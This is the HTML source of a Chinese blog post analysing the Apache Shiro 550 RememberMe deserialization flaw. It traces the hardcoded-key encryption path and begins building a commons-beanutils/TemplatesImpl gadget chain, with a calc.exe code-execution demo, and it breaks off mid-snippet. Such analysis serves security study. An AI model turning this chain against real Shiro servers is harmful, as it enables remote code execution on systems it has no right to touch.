@@ -1,0 +1,732 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="前言Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。
+在shiro &amp;lt; 1.2.4的版本中，由于采用了硬编码密钥，攻击者可以构造恶意Cookie，实现反序列化代码执行
+由于其Aes加密特性，可以天然的绕过WAF，因此此漏洞在如">
+  <meta name="author" content="Errorecho">
+  <meta name="keywords" content="">
+  <meta name="description" content="前言Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。 在shiro &lt; 1.2.4的版本中，由于采用了硬编码密钥，攻击者可以构造恶意Cookie，实现反序列化代码执行 由于其Aes加密特性，可以天然的绕过WAF，因此此漏洞在如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro 550 反序列化漏洞分析">
+<meta property="og:url" content="http://www.errorecho.com/2021/12/01/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Errorecho">
+<meta property="og:description" content="前言Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。 在shiro &lt; 1.2.4的版本中，由于采用了硬编码密钥，攻击者可以构造恶意Cookie，实现反序列化代码执行 由于其Aes加密特性，可以天然的绕过WAF，因此此漏洞在如">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124135829917.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124140053979.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124140739150.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124140438666.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-2021112414101799.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124141048316.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124141301550.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124141425692.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-2021112414165094.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124142104675.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124142229167.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124142620925.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124142727535.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124142830686.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124142853201.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124142932111.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124143104894.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124143220579.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124143450816.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124144543923.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124144607425.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124144709651.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124145113592.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124145141585.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124145345395.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124145427428.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124145750467.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124150329381.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211125161126989.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211125170958504.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211125171427472.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211125172038696.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126142856556.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126103049844.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-2021112610452128.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126143332141.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126105027463.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126105316758.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126111845691.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-2021112611192302.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126111949291.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126112045274.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126112132509.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126145104338.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126145204627.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211126150310555.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-2021112616022676.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211201154023502.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211201165236686.png">
+<meta property="article:published_time" content="2021-12-01T05:16:06.000Z">
+<meta property="article:modified_time" content="2021-12-02T06:34:13.720Z">
+<meta property="article:author" content="Errorecho">
+<meta property="article:tag" content="shrio">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://www.errorecho.com/img/markdown-img-paste-20211124135829917.png">
+  
+  <title>Shiro 550 反序列化漏洞分析 - Errorecho</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.errorecho.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Errorecho&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                文章
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                类别
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Shiro 550 反序列化漏洞分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-12-01 13:16" pubdate>
+        December 1, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      21k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      66 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Shiro 550 反序列化漏洞分析</h1>
+            
+            <div class="markdown-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。</p>
+<p>在shiro &lt; 1.2.4的版本中，由于采用了硬编码密钥，攻击者可以构造恶意Cookie，实现反序列化代码执行</p>
+<p>由于其Aes加密特性，可以天然的绕过WAF，因此此漏洞在如今依旧存在。</p>
+<span id="more"></span>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要讲述以下内容</p>
+<ul>
+<li>环境搭建</li>
+<li>加密过程</li>
+<li>解密过程</li>
+<li>无依赖Payload构造</li>
+<li>有依赖Payload构造</li>
+</ul>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用官方环境</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br>cd ./shiro<br><span class="hljs-comment"># 恢复到shiro-1.2.4版本</span><br>git checkout shiro-root-<span class="hljs-number">1.2</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+<p>修改<code>./shiro/samples/web/pom.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>taglibs<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>standard<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>导入IDEA，环境运行成功</p>
+<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="判断是否勾选RememberMe"><a href="#判断是否勾选RememberMe" class="headerlink" title="判断是否勾选RememberMe"></a>判断是否勾选RememberMe</h2><p>AbstractRememberMeManager.class<br>在onSuccessfulLogin打下断点<br><img src="/img/markdown-img-paste-20211124135829917.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里isRememberMe是判断是否勾选RememberMe</p>
+<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>因为已经勾选，所以进入判断调用rememberIdentity方法</p>
+<p><img src="/img/markdown-img-paste-20211124140053979.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里getIdentityToRemember是返回一个PrincipalCollection对象，里面包含登录信息。</p>
+<p><img src="/img/markdown-img-paste-20211124140739150.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进rememberIdentity()</p>
+<p><img src="/img/markdown-img-paste-20211124140438666.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进convertPrincipalsToBytes</p>
+<p><img src="/img/markdown-img-paste-2021112414101799.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进serialize</p>
+<p><img src="/img/markdown-img-paste-20211124141048316.png" srcset="/img/loading.gif" lazyload></p>
+<p>DefaultSerializer.java</p>
+<p>跟进serialize</p>
+<p><img src="/img/markdown-img-paste-20211124141301550.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进writeObject</p>
+<p><img src="/img/markdown-img-paste-20211124141425692.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后在baos.toByteArray()返回字符码</p>
+<p><img src="/img/markdown-img-paste-2021112414165094.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a>加密</h2><p>这里getCipherService()返回一个AesCipherService对象</p>
+<p><img src="/img/markdown-img-paste-20211124142104675.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入判断<br>跟进encrypt()</p>
+<p><img src="/img/markdown-img-paste-20211124142229167.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里存在代码</p>
+<p><code>ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</code></p>
+<p>serialized根据判断是之前的序列化字符串</p>
+<p>跟进getEncryptionCipherKey()</p>
+<p><img src="/img/markdown-img-paste-20211124142620925.png" srcset="/img/loading.gif" lazyload></p>
+<p>返回Aes密钥，这里的密钥是多久生成的呢？<br>查看构造函数</p>
+<p><img src="/img/markdown-img-paste-20211124142727535.png" srcset="/img/loading.gif" lazyload></p>
+<p>有一个setCipherKey方法， 参数为DEFAULT_CIPHER_KEY_BYTES</p>
+<p>参数为DEFAULT_CIPHER_KEY_BYTES可以找到，为硬编码的值</p>
+<p><img src="/img/markdown-img-paste-20211124142830686.png" srcset="/img/loading.gif" lazyload></p>
+<p>setCipherKey中含有setEncryptionCipherKey方法</p>
+<p><img src="/img/markdown-img-paste-20211124142853201.png" srcset="/img/loading.gif" lazyload></p>
+<p>setEncryptionCipherKey方法中设置了encryptionCipherKey的值</p>
+<p><img src="/img/markdown-img-paste-20211124142932111.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入encrypt()函数</p>
+<p>JcaCipherService.java</p>
+<p><img src="/img/markdown-img-paste-20211124143104894.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进，后面是Aes加密过程</p>
+<p><img src="/img/markdown-img-paste-20211124143220579.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终返回加密bytes</p>
+<h2 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h2><p>跟进rememberSerializedIdentity()方法</p>
+<p><img src="/img/markdown-img-paste-20211124143450816.png" srcset="/img/loading.gif" lazyload></p>
+<p>在154行存在base64加密操作</p>
+<p><code>String base64 = Base64.encodeToString(serialized);</code></p>
+<p>最后将其值保存至cookie中</p>
+<p>整个流程完成</p>
+<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><h2 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h2><p>在DefaultSecurityManager.class中的getRememberedIdentity()方法打入断点</p>
+<p><img src="/img/markdown-img-paste-20211124144543923.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进AbstractRememberMeManager.class的getRememberedPrincipals方法</p>
+<p><img src="/img/markdown-img-paste-20211124144607425.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进getRememberedSerializedIdentity方法</p>
+<p><img src="/img/markdown-img-paste-20211124144709651.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中关键代码</p>
+<p><code>String base64 = getCookie().readValue(request, response);</code></p>
+<p>获得Cookie中的base64加密字符</p>
+<p>在后续操作中，进行base64解密</p>
+<h2 id="Aes解密"><a href="#Aes解密" class="headerlink" title="Aes解密"></a>Aes解密</h2><p>返回getRememberedPrincipals方法，跟进convertBytesToPrincipals方法</p>
+<p><img src="/img/markdown-img-paste-20211124145113592.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入decrypt()操作</p>
+<p><img src="/img/markdown-img-paste-20211124145141585.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中getDecryptionCipherKey()跟加密操作一样</p>
+<p>最终返回解密后的字符串</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>跟进deserialize()</p>
+<p><img src="/img/markdown-img-paste-20211124145345395.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进DefaultSerializer.class的deserialize方法</p>
+<p><img src="/img/markdown-img-paste-20211124145427428.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终在</p>
+<p><code>T deserialized = (T) ois.readObject();</code></p>
+<p>实现了反序列化</p>
+<h2 id="ClassResolvingObjectInputStream"><a href="#ClassResolvingObjectInputStream" class="headerlink" title="ClassResolvingObjectInputStream"></a>ClassResolvingObjectInputStream</h2><p>这里跟进一下ClassResolvingObjectInputStream方法</p>
+<p><img src="/img/markdown-img-paste-20211124145750467.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里重写了resolveClass，关键实现变为<code>ClassUtils.forName(osc.getName());</code></p>
+<p>跟进一下</p>
+<p><img src="/img/markdown-img-paste-20211124150329381.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现使用了Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);来加载类</p>
+<p>而ClassLoader.loadClass不支持装载数组类型的class，因为我们cc链都是构造ChainedTransformer数组来实现，因此有一些cc链无法使用</p>
+<h1 id="无依赖payload构造"><a href="#无依赖payload构造" class="headerlink" title="无依赖payload构造"></a>无依赖payload构造</h1><p>在shiro原生依赖中，是没有commons-collections库的，但是却依赖了commons-beanutils库</p>
+<h2 id="commons-beanutils"><a href="#commons-beanutils" class="headerlink" title="commons-beanutils"></a>commons-beanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。</p>
+<h3 id="PropertyUtils-getProperty"><a href="#PropertyUtils-getProperty" class="headerlink" title="PropertyUtils.getProperty"></a>PropertyUtils.getProperty</h3><p>PropertyUtils.getProperty(Object bean, String name)</p>
+<ul>
+<li>bean 是不为null的Java Bean实例</li>
+<li>name 是Java Bean属性名称 (也就是方法中的getXxx(), setXxx(), 其中的xxx成为这个java bean的bean属性, java中的类成员变量称为字段, 并不是属性。</li>
+</ul>
+<p>这个方法的作用是调用bean对象中, 中的getname()方法</p>
+<p>示例<br>Cat.java</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino">package com.javasec.shiro;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> &#123;</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> name = <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span> throws Exception</span>&#123;<br>        Runtime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-keyword">String</span> name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Test.java</p>
+<p><code>PropertyUtils.getProperty(new Cat(),&quot;name&quot;);</code><br>可以调用Cat.getName()方法</p>
+<p>简而言之，这个方法实现了一个自动调用，可以自动调用参数一里的get参数二方法。</p>
+<h3 id="BeanComparator-compare"><a href="#BeanComparator-compare" class="headerlink" title="BeanComparator.compare"></a>BeanComparator.compare</h3><p><img src="/img/markdown-img-paste-20211125161126989.png" srcset="/img/loading.gif" lazyload></p>
+<p>BeanComparator.compare传入了两个参数，如果this.property为空，则直接比较这两个对象；如果this.property不为空，则用PropertyUtils.getProperty分别取这两个对象的this.property属性，比较属性的值。</p>
+<p>如果我们控制this.property的值，让它不为空且为特定值，就可以去调用特定的方法了</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>ClassLoader是⼀个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime</p>
+<p>ClassLoader 处理字节码的流程为 loadClass -&gt; findClass -&gt; defineClass</p>
+<ul>
+<li>loadClass: 从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass</li>
+<li>​ findClass: 根据基础URL指定的方式来加载类的字节码</li>
+<li>defineClass：处理前面传入的字节码，将其处理成真正的Java类</li>
+</ul>
+<p>查看defineClass源码</p>
+<p><img src="/img/markdown-img-paste-20211125170958504.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到，该方法是一个保护方法，只能通过反射调用，不具有实战价值</p>
+<h3 id="TransletClassLoader"><a href="#TransletClassLoader" class="headerlink" title="TransletClassLoader"></a>TransletClassLoader</h3><p>TemplatesImpl 类中有一个内部类 TransletClassLoader，重写了 defineClass方法，同时没有显示的声明其定义域。</p>
+<p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</p>
+<p><img src="/img/markdown-img-paste-20211125171427472.png" srcset="/img/loading.gif" lazyload></p>
+<p>由于是内部类，TransletClassLoader只允许TemplatesImpl类进行调用</p>
+<p>因此需要查找TemplatesImpl中TransletClassLoader的调用情况</p>
+<h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h3><p>在defineTransletClasses中存在TransletClassLoader的调用</p>
+<p><img src="/img/markdown-img-paste-20211125172038696.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析代码，这里对_bytecodes的值进行判断，如果为空则退出，因此_bytecodes需要进行赋值</p>
+<p>后面存在一个_tfactory.getExternalExtensionsMap()的调用<br>getExternalExtensionsMap()是TransformerFactoryImpl.class的一个方法，因此_tfactory的值应为一个TransformerFactoryImpl对象</p>
+<p>继续分析，走到后门，发现一个loader.defineClass(_bytecodes[i])，而参数的值正好为_bytecodes中的值，如果控制_bytecodes中的值为一个恶意字节码类，就可以实现任意代码执行</p>
+<p><img src="/img/markdown-img-paste-20211126142856556.png" srcset="/img/loading.gif" lazyload></p>
+<p>但由于其是私有方法，不能直接调用，因此还需要找defineTransletClasses的调用情况</p>
+<p>查找情况如下</p>
+<ul>
+<li>private</li>
+<li>getTransletInstance</li>
+<li>getTransletClasses</li>
+<li>public</li>
+<li>getTransletIndex</li>
+</ul>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>调用getTransletIndex方法</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> Test &#123;<br>    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        field.set(obj, value);<br>    &#125;<br><br>    public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span 